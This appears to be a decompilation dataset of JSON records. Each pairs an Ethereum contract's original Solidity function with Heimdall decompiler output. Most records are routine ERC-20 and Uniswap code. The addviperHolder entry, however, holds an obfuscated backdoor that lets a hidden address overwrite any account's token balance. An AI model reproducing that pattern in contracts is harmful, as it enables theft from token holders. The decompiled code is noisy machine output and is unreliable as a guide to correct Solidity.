{"contract_address": "0xd8B220bAC6b58743AAf968A18859963016f4f21F", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_c) {\n            if (store_c - ((store_c >> 0x01) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_c >> 0x01)) / 0x20) * 0x20));\n                bytes32 var_d = store_c >> 0x01;\n                if (store_c) {\n                    if (store_c - ((store_c >> 0x01) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_c >> 0x01) {\n                            if (0x1f < (store_c >> 0x01)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_c >> 0x01) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked(0x20, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x4d940f5C7f67BcD5997a27F9E3b97028B226e292", "original_solidity_code": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }", "heimdall_decompiled_code": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }"}
{"contract_address": "0x1D5440C230454f3ace76faaC9312bf06078f8B3b", "original_solidity_code": "function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }", "heimdall_decompiled_code": "function removeLimits() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        if (0x08) {\n            if ((0x01 == 0x01) | !0x3b9aca00) {\n                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_f = 0x11;\n                _maxTxAmount = 0x3b9aca00;\n                if (0x08) {\n                    if ((0x01 == 0x01) | !0x3b9aca00) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        _maxWalletSize = 0x3b9aca00;\n                        transferDelayEnabled = uint248(transferDelayEnabled);\n                        if (0x08) {\n                            if ((0x01 == 0x01) | !0x3b9aca00) {\n                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                var_f = 0x11;\n                                var_a = 0x3b9aca00;\n                                emit MaxTxAmountUpdated(0x3b9aca00);\n                                if (0x0a) {\n                                    if (0x0a == 0x01) {\n                                        if (0x0a == 0x02) {\n                                            if (!0x08 > 0xff) {\n                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                var_f = 0x11;\n                                                if (!((0x0a < 0x0b) & (0x08 < 0x4e)) | ((0x0a < 0x0133) & (0x08 < 0x20))) {\n                                                    if (!0x08 > 0x01) {\n                                                        if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                            var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                            var_f = 0x11;\n                                                            if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                                                var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                                                var_f = 0x11;\n                                                                if (!0) {\n                                                                }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x9cE4E67bFC441B766d43D1C2C8929A281E35A294", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x02;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_h[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8EF34AD921FF8e7D465210EbBe3029fB7B2dd294", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public payable {\n        require(address(owner) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x2FcB9FA9FeC15b2d86440d10b940BB9f2Bd6f770", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0x9cE4E67bFC441B766d43D1C2C8929A281E35A294", "original_solidity_code": "function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }", "heimdall_decompiled_code": "function openTrading() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(!(bytes1(store_g / 0x010000000000000000000000000000000000000000)), \"trading is already open\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x17;\n        var_d = 0x74726164696e6720697320616c7265616479206f70656e000000000000000000;\n        store_f = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d | (uint96(store_f));\n        require(0x09, \"ERC20: approve to the zero address\");\n        require((0x01 == 0x01) | !0x0f4240, \"ERC20: approve to the zero address\");\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(0x7a250d5630b4cf539739df2c5dacb4c659f2488d, \"ERC20: approve to the zero address\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x22;\n        var_d = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        address var_e = address(this);\n        var_h = 0x02;\n        var_e = 0x7a250d5630b4cf539739df2c5dacb4c659f2488d;\n        address var_h = keccak256(var_e);\n        storage_map_n[var_e] = 0x0f4240;\n        var_a = 0x0f4240;\n        emit Approval(address(this), 0x7a250d5630b4cf539739df2c5dacb4c659f2488d, 0x0f4240);\n        var_a = 0xc45a015500000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).factory(var_b); // staticcall\n        uint256 var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_j = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_f / 0x01).WETH(var_c); // staticcall\n        var_i = var_i + (uint248(ret0.length + 0x1f));\n        require(!((var_i + ret0.length) - var_i) < 0x20);\n        require(var_i.length == (address(var_i.length)));\n        var_k = 0xc9c6539600000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        uint256 var_g = address(var_i.length);\n        (bool success, bytes memory ret0) = address(var_i.length).Unresolved_c9c65396(var_d); // call\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x24;\n        var_d = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n        if (0x0a) {\n            if (0x0a == 0x01) {\n                if (0x0a == 0x02) {\n                    if (!0x09 > 0xff) {\n                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_f = 0x11;\n                        if (!((0x0a < 0x0b) & (0x09 < 0x4e)) | ((0x0a < 0x0133) & (0x09 < 0x20))) {\n                            if (!0x09 > 0x01) {\n                                if (!0x01 > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                    var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                    var_f = 0x11;\n                                    if (!0x0a > 0x1999999999999999999999999999999999999999999999999999999999999999) {\n                                        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                                        var_f = 0x11;\n                                        if (!0x01) {\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x9e98f34dA0bD240e681c1287eeCfE03d7Ab03546", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_h[var_a];\n        return storage_map_h[var_a];\n    }"}
{"contract_address": "0x3A2D2970A74e4a254145b5EbA3eE63d4EdcbaD2c", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0xFF5C43C4fADdF9A03BEdE1D0b276E7eC996504a1", "original_solidity_code": "function manualswap() external {\r\n        require(_msgSender() == _developmentAddress || _msgSender() == _marketingAddress);\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        swapTokensForEth(contractBalance);\r\n    }", "heimdall_decompiled_code": "function manualswap() public view {\n        require(address(msg.sender) == (address(store_p)));\n        require(address(msg.sender) == (address(store_q)));\n        address var_a = address(this);\n        var_b = 0x02;\n        require(!(storage_map_g[var_a] > store_m), \"Amount must be less than total reflections\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x2a;\n        var_f = 0x416d6f756e74206d757374206265206c657373207468616e20746f74616c2072;\n        var_g = 0x65666c656374696f6e7300000000000000000000000000000000000000000000;\n        uint256 var_h = 0x40 + var_h;\n        var_c = 0x1a;\n        var_i = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x0de0b6b3a7640000, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_j = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_h.length;\n        uint256 var_k = 0;\n        var_l = var_m;\n        var_k = 0;\n        if (0x0de0b6b3a7640000) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_n = 0x12;\n            if (!store_m < (store_m / 0x0de0b6b3a7640000)) {\n            }\n        }\n    }"}
{"contract_address": "0xE5513c73eaCe54F05fDfa98061784bfd66b86bEA", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!(storage_map_e[var_a] < arg1), \"ERC20: decreased allowance below zero\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a2064656372656173656420616c6c6f77616e63652062656c6f77;\n        var_g = 0x207a65726f000000000000000000000000000000000000000000000000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_e[var_a] = storage_map_e[var_a] - arg1;\n        uint256 var_c = storage_map_e[var_a] - arg1;\n        emit Approval(address(msg.sender), address(arg0), storage_map_e[var_a] - arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x243aA7135A82d62dc6847C1Ad5A2E7c87c01502d", "original_solidity_code": "function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n    event Burn(\r\n        address indexed sender,\r\n        uint256 amount0,\r\n        uint256 amount1,\r\n        address indexed to\r\n    );\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function burn(address to)\r\n        external\r\n        returns (uint256 amount0, uint256 amount1);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x03;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x693E9C1e8935caf91F006bf5a2FF8a1aB2C569c7", "original_solidity_code": "function setDistributionCriteria(uint256 newMinPeriod, uint256 newMinDistribution) external onlyOwner {\r\n        magaPrinter.setDistributionCriteria(newMinPeriod, newMinDistribution);        \r\n    }", "heimdall_decompiled_code": "function setDistributionCriteria(uint256 arg0, uint256 arg1) public {\n        require(msg.sender == (address(getOwner)), \"!Owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x06;\n        var_d = 0x214f776e65720000000000000000000000000000000000000000000000000000;\n        var_a = 0x2d48e89600000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = arg0;\n        uint256 var_c = arg1;\n        require(address(magaPrinter).code.length);\n        (bool success, bytes memory ret0) = address(magaPrinter).Unresolved_2d48e896(var_b); // call\n    }"}
{"contract_address": "0xB9FB64018E475BBCF128E391E62274599c4D848C", "original_solidity_code": "function approve(address operator, uint256 tokenId)\\n        public\\n        override\\n        onlyAllowedOperatorApproval(operator)\\n    {\\n        super.approve(operator, tokenId);\\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!address(0xaaeb6d7670e522a718067333cd4e).code.length, CustomError_df2d9b42());\n        require(0x01 > arg1, CustomError_df2d9b42());\n        require(!(arg1 < totalSupply), CustomError_df2d9b42());\n        uint256 var_a = arg1;\n        var_b = 0x04;\n        require(0 - (bytes1(storage_map_b[var_a])), CustomError_df2d9b42());\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        require(0 - storage_map_b[var_a], CustomError_cfb3b942());\n        require(address(storage_map_b[var_a]) == msg.sender, CustomError_cfb3b942());\n        var_a = address(storage_map_b[var_a]);\n        var_b = 0x07;\n        var_a = msg.sender;\n        uint256 var_b = keccak256(var_a);\n        require(bytes1(storage_map_b[var_a]), CustomError_cfb3b942());\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_c = 0xcfb3b94200000000000000000000000000000000000000000000000000000000;\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_b[var_a] = (address(arg0)) | (uint96(storage_map_b[var_a]));\n        emit Approval(address(storage_map_b[var_a]), address(arg0), arg1);\n        var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1;\n        var_b = 0x04;\n        if (0 - storage_map_b[var_a]) {\n            var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1);\n            var_b = 0x04;\n            if (0 - storage_map_b[var_a]) {\n                var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1));\n                var_b = 0x04;\n                if (0 - storage_map_b[var_a]) {\n                }\n            }\n        }\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xc617113400000000000000000000000000000000000000000000000000000000;\n        address var_d = address(this);\n        address var_e = address(arg0);\n        (bool success, bytes memory ret0) = address(0xaaeb6d7670e522a718067333cd4e).Unresolved_c6171134(var_d); // staticcall\n        uint256 var_f = var_f + (uint248(ret0.length + 0x1f));\n        require(!(((var_f + ret0.length) - var_f) < 0x20), CustomError_ede71dcc());\n        require(var_f.length == var_f.length, CustomError_ede71dcc());\n        require(var_f.length, CustomError_ede71dcc());\n        var_g = 0xede71dcc00000000000000000000000000000000000000000000000000000000;\n        var_e = address(arg0);\n    }"}
{"contract_address": "0x00BCB434254797479bade33e1eF0aEBDB3F27089", "original_solidity_code": "function setMaxTransactionAmount(uint256 newValue) external onlyOwner {\r\n        require(\r\n            newValue >= ((totalSupply() * 2) / 1000) / 1e18,\r\n            \"Cannot set maxTx Amount lower than 0.2%\"\r\n        );\r\n        emit MaxTransactionAmountChange(newValue, maxTxAmount);\r\n        maxTxAmount = newValue;\r\n    }", "heimdall_decompiled_code": "function setMaxTransactionAmount(uint256 arg0) public view {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require((totalSupply == ((totalSupply * 0x02) / 0x02)) | !0x02);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x11;\n        require(0x03e8);\n        var_e = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x12;\n    }"}
{"contract_address": "0x781243eaa7c0Eb4ba152e4709347249fAA1c7Bc1", "original_solidity_code": "function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {\\r\\n      _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\\r\\n      return true;\\r\\n    }", "heimdall_decompiled_code": "function increaseAllowance(address arg0, uint256 arg1) public payable returns (bool) {\n        address var_a = msg.sender;\n        var_b = 0x05;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        require(!((arg1 + storage_map_d[var_a]) < storage_map_d[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        var_a = address(msg.sender);\n        var_b = 0x05;\n        var_a = address(arg0);\n        var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1 + storage_map_d[var_a];\n        uint256 var_c = arg1 + storage_map_d[var_a];\n        emit Approval(address(msg.sender), address(arg0), arg1 + storage_map_d[var_a]);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x22;\n        var_h = this.code[3127:3161];\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = (0x20 + (0x04 + var_g)) - (0x04 + var_g);\n        var_e = 0x24;\n        var_h = this.code[3276:3312];\n    }"}
{"contract_address": "0x10A7A2212f6b6ffE22d339D8Aa6e89a17ad8b1ad", "original_solidity_code": "function transferOwnership(address) public pure override {\n        revert(\"Not Allow Transfer Ownership.\");\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public pure {\n        require(arg0 == (address(arg0)));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x1d;\n        var_e = 0x4e6f7420416c6c6f77205472616e73666572204f776e6572736869702e000000;\n    }"}
{"contract_address": "0x3f91B8467d1eE998DE6344903e2fDEB6252d4c8b", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_i[var_a];\n        return storage_map_i[var_a];\n    }"}
{"contract_address": "0x53BF9362f1eD90638B06392Bc01813f162Eb8766", "original_solidity_code": "function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
